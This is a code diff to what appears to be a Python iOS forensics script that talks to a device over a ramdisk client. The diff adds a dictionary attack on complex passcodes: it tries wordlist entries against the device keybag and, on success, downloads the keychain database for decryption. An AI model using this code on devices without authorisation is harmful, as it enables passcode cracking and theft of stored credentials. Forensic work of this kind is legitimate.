@@ -7,7 +7,7 @@ from util.ramdiskclient import RamdiskToolClient
 from util import write_file
 
 def checkPasscodeComplexity(rdclient):
-    pl = rdclient.downloadFile("/mnt2/mobile/Library/ConfigurationProfiles/UserSettings.plist")
+    pl = rdclient.downloadFile("/mnt2/mobile/Library/ConfigurationProfiles/PublicInfo/EffectiveUserSettings.plist")
     if not pl:
         print "Failed to download UserSettings.plist, assuming simple passcode"
         return 0
@@ -16,6 +16,7 @@ def checkPasscodeComplexity(rdclient):
     return pl["restrictedValue"]["passcodeKeyboardComplexity"]["value"]
 
 def bf_system():
+    curdir = os.path.dirname(os.path.abspath(__file__))
     client = RamdiskToolClient()
     di = client.getDeviceInfos()
     devicedir = di["udid"]
@@ -68,7 +69,24 @@ def bf_system():
             di["classKeys"] = kb.getClearClassKeysDict()
             di.save()
         else:
-            print "Complex passcode used !"
+            print "Complex passcode used, trying dictionary attack ..."
+            dictfile = os.path.join(curdir, 'wordlist.dict')
+            try:
+                 wordlist = open(dictfile, 'r').readlines()
+            except (OSError, IOError), e:
+                exit(e)
+            for line in wordlist:
+                res = client.getPasscodeKey(systembag["KeyBagKeys"].data, line.rstrip('\n'))
+                if kb.unlockWithPasscodeKey(res.get("passcodeKey").decode("hex")):
+                    print "Passcode \"%s\" OK" % line.rstrip('\n')
+                    di.update(res)
+                    keybags[kbuuid].update(res)
+                    di.save()
+                    keychain_blob = client.downloadFile("/mnt2/Keychains/keychain-2.db")
+                    write_file("keychain-2.db", keychain_blob)
+                    print "Downloaded keychain database, use keychain_tool.py to decrypt secrets"
+                    return
+            print "Passcode not found!"
             return
         
     #keychain_blob =    client.downloadFile("/private/var/Keychains/keychain-2.db")
